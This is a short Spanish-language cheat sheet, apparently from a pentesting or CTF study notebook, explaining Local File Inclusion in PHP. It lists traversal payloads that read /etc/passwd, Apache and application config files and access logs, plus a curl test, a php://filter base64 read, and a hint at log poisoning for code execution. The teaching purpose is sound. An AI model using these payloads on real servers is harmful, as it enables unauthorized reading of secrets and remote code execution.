## Local File Inclusion (LFI) / Path Traversal

**LFI** (Local File Inclusion) ocurre cuando una aplicación incluye un archivo local usando un valor que el usuario controla, sin validarlo. Permite **leer archivos del servidor** fuera del directorio web.

### Cómo funciona

Un patrón típico vulnerable:

```php
include($_GET['page'] . '.php');
```

Si `page` no se valida, podemos pedir otros archivos:

```
http://IP/index?page=../../../../etc/passwd
```

> `../../` sube directorios hasta salir del directorio web y llegar a `/etc/passwd`.

### Payloads útiles

```bash
# /etc/passwd
../../../../etc/passwd
....//....//....//etc/passwd   # bypass de filtros simples
/etc/passwd%00                 # null byte (obsoleto en PHP moderno)

# Archivos de configuración con secretos
../../../../etc/apache2/apache2.conf
../../../../var/www/html/config.php

# Logs (a veces permite RCE en lugar de solo lectura)
../../../../var/log/apache2/access.log
```

### Detección manual

```bash
# Prueba rutas comunes de inclusión
curl 'http://IP/index?page=../../../../etc/passwd'
```

Si ves el contenido de `/etc/passwd` (o un error de "include failed") → confirmado.

### Siguiente paso

- Si hay **inclusión de logs** y podemos meter PHP en el log (vía `User-Agent`), se convierte en **RCE**.
- Si está PHP, usar `php://filter` para ver archivos codificados en base64:
  ```
  http://IP/index?page=php://filter/convert.base64-encode/resource=/etc/passwd
  ```

> En [Aplicaciones](../../Utilidades/Aplicaciones.md) tienes reverse shells por si logras convertir el LFI en ejecución de código.